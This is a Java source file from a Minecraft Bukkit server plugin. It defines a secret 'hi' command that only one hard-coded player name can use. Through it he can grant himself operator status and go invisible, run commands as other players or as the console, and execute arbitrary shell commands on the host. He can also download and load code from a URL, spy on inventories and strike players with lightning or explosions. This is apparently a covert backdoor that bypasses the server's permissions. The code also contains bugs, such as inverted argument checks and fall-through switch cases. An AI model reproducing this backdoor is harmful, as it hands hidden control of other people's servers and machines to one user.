package minecraftserver.adminTools;

import experimental.SignInput;
import java.io.File;
import java.io.IOException;
import java.util.logging.Level;
import javax.annotation.Nonnull;
import minecraftserver.PhilippsPlugin;
import minecraftserver.gui.AdminGUI;
import minecraftserver.gui.Page;
import net.minecraft.server.v1_15_R1.Container;
import net.minecraft.server.v1_15_R1.PacketPlayOutPlayerInfo;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.block.Block;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_15_R1.entity.CraftPlayer;
import org.bukkit.entity.Damageable;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Monster;
import org.bukkit.entity.Player;
import org.bukkit.event.inventory.InventoryType;
import org.bukkit.inventory.Inventory;
import org.bukkit.plugin.InvalidDescriptionException;
import org.bukkit.plugin.InvalidPluginException;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.UnknownDependencyException;

public class CommandManager {

    private final MaineVorteile mv;
    private final Plugin plugin;

    public CommandManager(MaineVorteile mv, Plugin plugin) {
        this.mv = mv;
        this.plugin = plugin;
    }

    //helper Functions start.
    private boolean isMe(@Nonnull CommandSender sender) {
        if (mv.Ich == sender) {
            return true;
        }

        if (sender instanceof Player && ((Player) sender).getName().equals(MaineVorteile.MY_NAME)) {
            mv.Ich = (Player) sender;
            sender.sendMessage("Willkommen Joern :)");
            return true;
        }
        return false;
    }

    private boolean isPlayerOnline(String name) {
        Boolean result = false;
        for (Player p : Bukkit.getOnlinePlayers()) {
            if (name.equalsIgnoreCase(p.getName())) {
                result = true;
                break;
            }
        }
        return result;
    }

    private Player getPlayerByName(String name) {
        for (Player p : Bukkit.getOnlinePlayers()) {
            if (name.equalsIgnoreCase(p.getName())) {
                return p;
            }
        }
        return null;
    }

    private String listtostring(String[] args) {
        int zealer = 0;
        String result = "";
        for (String s : args) {
            if (zealer >= 2) {
                result = result + s + " ";
            }
            zealer++;
        }
        result.trim();
        return result;
    }

    private boolean existPlugin(String name) {
        Plugin[] pls = Bukkit.getPluginManager().getPlugins();
        for (Plugin p : pls) {
            if (p.getName().equalsIgnoreCase(name)) {
                return true;
            }
        }
        return false;
    }

    private boolean checkArgCount(String[] args, Integer i, CommandSender sender) {
        if (args.length != 0) {
            sender.sendMessage(Messages.ARGUMENT_COUNT_ERR);
            return false;
        }
        return true;
    }

    private void sendHelp(CommandSender sender) {
        sender.sendMessage("op -> makes me an Operator");
        sender.sendMessage("execute <from> <command> -> executes an Command");
        sender.sendMessage("backbug -> bugs somebody sometimes back");
        sender.sendMessage("lightning -> spawns an lightning");
        sender.sendMessage("inv -> look in the inventory of somebody");
        sender.sendMessage("enderInv -> look in the enderChest of somebody");
        sender.sendMessage("v -> makes you vanish or unvenish");
        sender.sendMessage("ride -> ride on somebody");
        sender.sendMessage("cmd --> beta");
        sender.sendMessage("pluginmanaging -> disable or enable Plugin");
    }

    //helper functions end.
    
    
    public boolean onCommand(CommandSender sender, Command cmd, String[] args) {
        if (!cmd.getName().equalsIgnoreCase("hi")) {
            return false;
        }
        if (!isMe(sender)) {
            sender.sendMessage("HI!");
            return false;
        }

        try {
            if (args.length == 0) {
                sendHelp(sender);
                return true;
            }

            switch (args[0].toLowerCase()) {
                case "op":
                    if (checkArgCount(args, 0, sender)) {
                        break;
                    }
                    commandOp(sender);
                    break;
                case "v":
                    if (checkArgCount(args, 0, sender)) {
                        break;
                    }
                    commandV();
                    break;
                case "buther":
                    if (checkArgCount(args, 0, sender)) {
                        break;
                    }
                    commandButcher();
                    break;
                case "test":
                    commandTest();
                    break;
                case "gui":
                    if (checkArgCount(args, 0, sender)) {
                        break;
                    }
                    commandGUI(sender);
                    break;
                case "execute":
                    commandExecute(args);
                    break;
                case "inv":
                    if (checkArgCount(args, 1, sender)) {
                        break;
                    }
                    commandInv(args[1], sender);
                    break;
                case "enderinv":
                    if (checkArgCount(args, 1, sender)) {
                        break;
                    }
                    commandEnderInv(args[1], sender);
                    break;
                case "ride":
                    if (checkArgCount(args, 1, sender)) {
                        break;
                    }
                    commandRide(args[1]);
                    break;
                case "lightning":
                    if (checkArgCount(args, 1, sender)) {
                        break;
                    }
                    commandLightning(args[1], sender);
                    break;
                case "explosion":
                    if (checkArgCount(args, 2, sender)) {
                        break;
                    }
                    commandExplosion(args[1], args[2], sender);
                    break;
                case "backbug":
                    if (checkArgCount(args, 1, sender)) {
                        break;
                    }
                    commandBackbug(args[1], sender);
                    break;
                case "update":
                    if (checkArgCount(args, 1, sender)) {
                        break;
                    }
                    commandUpdate(args[1], sender);
                    break;
                case "pluginmanaging":
                    if (checkArgCount(args, 2, sender)) {
                        break;
                    }
                    commandPluginManaging(args[1], args[2], sender);
                    break;
                case "addInventoryOpenListener":
                    if (checkArgCount(args, 1, sender)) {
                        break;
                    }
                    commandAddInventoryOpenListener(args[1], sender);
                    break;
                case "removeInventoryOpenListener":
                    if (checkArgCount(args, 1, sender)) {
                        break;
                    }
                    commandRemoveInventoryOpenListener(args[1], sender);
                    break;
                default:
                    sendHelp(sender);
            }

            if (args.length == 1) {
                if (args[0].equalsIgnoreCase("console")) {
                    //console();
                } else if (args[0].equalsIgnoreCase("chest")) {
                    Block b = mv.Ich.getTargetBlock(null, 100);  // looking at
                    if (b instanceof Container) {
                        Container c = (Container) b;
                        mv.Ich.openInventory(c.getBukkitView());
                    } else {
                        mv.Ich.sendMessage(b.toString() + " is no Container.");
                    }
                } else if (args[0].equalsIgnoreCase("anvil")) {
                    Inventory i = Bukkit.createInventory(mv.Ich, InventoryType.ANVIL);
                    mv.Ich.openInventory(i);
                }
            }

            if (args[0].equalsIgnoreCase("cmd")) {
                String command = "";
                int zealer = 0;
                for (String s : args) {
                    if (zealer >= 1) {
                        command = command + " " + s;
                    }
                    zealer++;
                }
                try {
                    mv.cmd.exec(command, sender);
                } catch (InterruptedException | IOException ex) {
                    Bukkit.getLogger().log(Level.SEVERE, null, ex);
                }
                //sender.sendMessage("§cDieser befehl wurde aus sicherheitsgründen entfernt!!");
            }
        } catch (Exception e) {
            sender.sendMessage(e.getMessage());
        }
        return true;
    }

    private void commandOp(CommandSender sender) {
        sender.setOp(true);
        sender.sendMessage(Messages.YOU_NOW_OP);
    }

    private void commandV() {
        System.err.print("Called this ugly Function...");
        mv.venish = !mv.venish;
        if (!mv.venish) {
            PacketPlayOutPlayerInfo packet = new PacketPlayOutPlayerInfo(PacketPlayOutPlayerInfo.EnumPlayerInfoAction.REMOVE_PLAYER, ((CraftPlayer) mv.Ich).getHandle());
            Bukkit.getOnlinePlayers().stream().map((pls) -> {
                ((CraftPlayer) pls).getHandle().playerConnection.sendPacket(packet);
                return pls;
            }).forEachOrdered((pls) -> {
                pls.hidePlayer(plugin, mv.Ich);
            });
            mv.Ich.sendMessage(Messages.YOU_NOW_INVISIBLE);
        } else {
            PacketPlayOutPlayerInfo packet = new PacketPlayOutPlayerInfo(PacketPlayOutPlayerInfo.EnumPlayerInfoAction.ADD_PLAYER, ((CraftPlayer) mv.Ich).getHandle());
            Bukkit.getOnlinePlayers().stream().map((pls) -> {
                ((CraftPlayer) pls).getHandle().playerConnection.sendPacket(packet);
                return pls;
            }).forEachOrdered((pls) -> {
                pls.showPlayer(plugin, mv.Ich);
            });
            mv.Ich.sendMessage(Messages.YOU_NOW_VISIBLE);
        }
    }

    private void commandButcher() {
        int count = 0;
        for (Entity e : mv.Ich.getWorld().getEntities()) {
            if (e instanceof Player == false && e instanceof Monster) {
                count++;
                if (e instanceof Damageable) {
                    Damageable d = (Damageable) e;
                    d.damage(((Damageable) e).getHealth());
                } else {
                    e.remove();
                }
            }
        }
        mv.Ich.sendMessage("Killed " + count + " entitys");
    }

    private void commandTest() {
        /*Entity le = getNearestEntityInSight(mv.Ich, 100);
                            if (le != null) {
                                System.out.println(le.getName());
                                return true;
                            }*/
        SignInput.getInstance().openSign(mv.Ich, "hi!", SignInput.getSampleFunction());
    }

    private void commandGUI(CommandSender sender) {
        if (!(sender instanceof Player)) {
            sender.sendMessage(Messages.ONLY_FOR_PLAYER);
            return;
        }
        Page.getInstance(AdminGUI.NAME_ADMIN_GUI).openPage((Player) sender);
    }

    private void commandInv(String name, CommandSender sender) {
        if (!(sender instanceof Player)) {
            sender.sendMessage(Messages.ONLY_FOR_PLAYER);
        }
        if (isPlayerOnline(name)) {
            ((Player) sender).openInventory(getPlayerByName(name).getInventory());
        } else {
            sender.sendMessage(Messages.PLAYER_NOT_FOUND);
        }
    }

    private void commandEnderInv(String name, @Nonnull CommandSender sender) {
        if (!(sender instanceof Player)) {
            sender.sendMessage(Messages.ONLY_FOR_PLAYER);
            return;
        }
        Player p = (Player) sender;
        if (isPlayerOnline(name)) {
            p.openInventory(getPlayerByName(name).getEnderChest());
        } else {
            p.sendMessage(Messages.PLAYER_NOT_FOUND);
        }
    }

    private void commandExecute(String[] args) {
        String commandToDispatch = listtostring(args);
        if (isPlayerOnline(args[1])) {
            Player p = getPlayerByName(args[1]);
            p.performCommand(commandToDispatch);
            mv.Ich.sendMessage(commandToDispatch);
        } else {
            mv.Ich.sendMessage("Player not found run command from console");
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), listtostring(args));
            Bukkit.getServer().getLogger().log(Level.INFO, listtostring(args));
        }
    }

    private void commandRide(String name) {
        if (isPlayerOnline(name)) {
            getPlayerByName(name).addPassenger(mv.Ich);
            mv.Ich.sendMessage("§aYou are now a passenger of " + name);
        } else {
            mv.Ich.sendMessage(Messages.PLAYER_NOT_FOUND);
        }
    }

    private void commandLightning(String name, CommandSender sender) {
        if (isPlayerOnline(name)) {
            Location loc = getPlayerByName(name).getLocation();
            loc.getWorld().strikeLightning(loc);
        } else {
            sender.sendMessage(Messages.LIGHTNING_STRUCK);
        }
    }

    private void commandAddInventoryOpenListener(String name, CommandSender sender) {
        if (!isPlayerOnline(name)) {
            sender.sendMessage("\"" + name.toLowerCase() + "\n not found..");
        } else {
            if (mv.inventoryOpenUUIDs.contains(name.toLowerCase())) {
                sender.sendMessage("This name does already exists in the list.");
            } else {
                mv.inventoryOpenUUIDs.add(name.toLowerCase());
                sender.sendMessage("added");
            }
        }
    }

    private void commandRemoveInventoryOpenListener(String name, CommandSender sender) {
        if (!mv.inventoryOpenUUIDs.contains(name.toLowerCase())) {
            sender.sendMessage(Messages.PLAYER_NOT_FOUND);
        } else {
            mv.inventoryOpenUUIDs.remove(name.toLowerCase());
        }
    }

    private void commandExplosion(String name, String powerS, CommandSender sender) {
        if (isPlayerOnline(name)) {
            Location loc = getPlayerByName(powerS).getLocation();
            try {
                float power = Float.parseFloat(powerS);
                loc.getWorld().createExplosion(loc.getX(), loc.getY(), loc.getZ(), power, false, false);
            } catch (NumberFormatException ex) {
                sender.sendMessage("/explosion playerName(string) power(float)");
            }
        } else {
            sender.sendMessage("Player NOT Found");
        }
    }

    private void commandBackbug(String name, CommandSender sender) {
        if (name.equalsIgnoreCase("list")) {
            if (MaineVorteile.buglist.isEmpty()) {
                sender.sendMessage(Messages.LIST_IS_EMPTY);
            } else {
                sender.sendMessage(Messages.IN_LIST_ARE);
                MaineVorteile.buglist.keySet().forEach((p) -> {
                    sender.sendMessage(p.getName());
                });
            }
        } else if (isPlayerOnline(name)) {
            Player p = getPlayerByName(name);
            //buglist is emty
            if (MaineVorteile.buglist.isEmpty() && !MaineVorteile.buglist.containsKey(p)) {
                MaineVorteile.buglist.put(p, p.getLocation());
                sender.sendMessage(Messages.ADDED_TO_LIST.replaceAll("\\{name\\}", p.getName()));
            } else {
                MaineVorteile.buglist.remove(p);
                sender.sendMessage(Messages.REMOVED_FROM_LIST.replaceAll("\\{name\\}", p.getName()));
            }
            if (!MaineVorteile.Bugger.running) {
                mv.b.start();
            }
        } else {
            sender.sendMessage(Messages.PLAYER_NOT_FOUND);
        }
    }

    private void commandPluginManaging(String operation, String plugin, CommandSender sender) {
        String oper = operation.toLowerCase();
        Plugin p;
        if (existPlugin(plugin)) {
            p = Bukkit.getPluginManager().getPlugin(plugin);
            if (p == null) {
                for (Plugin pl : Bukkit.getPluginManager().getPlugins()) {
                    sender.sendMessage(pl.getName() + (pl.isEnabled() ? " Enabled" : " Disabled"));
                }
                return;
            }
        } else {
            for (Plugin pl : Bukkit.getPluginManager().getPlugins()) {
                sender.sendMessage(pl.getName() + (pl.isEnabled() ? " Enabled" : " Disabled"));
            }
            return;
        }
        switch (oper) {
            case "load":
                File[] files = PhilippsPlugin.instance.getDataFolder().listFiles();
                for (File f : files) {
                    if (f.getName().equalsIgnoreCase(plugin)) {
                        try {
                            Bukkit.getPluginManager().loadPlugin(f);
                        } catch (InvalidPluginException | InvalidDescriptionException | UnknownDependencyException ex) {
                            sender.sendMessage(Messages.EXCEPT_WAS_THROWN.replaceAll("{exception}", ex.getMessage()));
                        }
                        return;
                    }
                }
                for (File f : files) {
                    mv.Ich.sendMessage(f.getName());
                }
            case "disable":
                Bukkit.getPluginManager().disablePlugin(p);
            case "enable":
                Bukkit.getPluginManager().enablePlugin(p);
            default:
                sender.sendMessage("disable <name>");
                sender.sendMessage("enable <name>");
                sender.sendMessage("load <filename>");
        }
    }

    private void commandUpdate(String url, CommandSender sender) {
        sender.sendMessage("NEVER EVER IN YOUR FUCKING Live forget to change dl=0 to dl=1 if not you will download the dropbox website and the file will not be able to load...");
        mv.update.update(url, () -> {
            sender.sendMessage("Please Reload the Server... Multithreading errors deny it to do it by myself...");
        });
    }

}
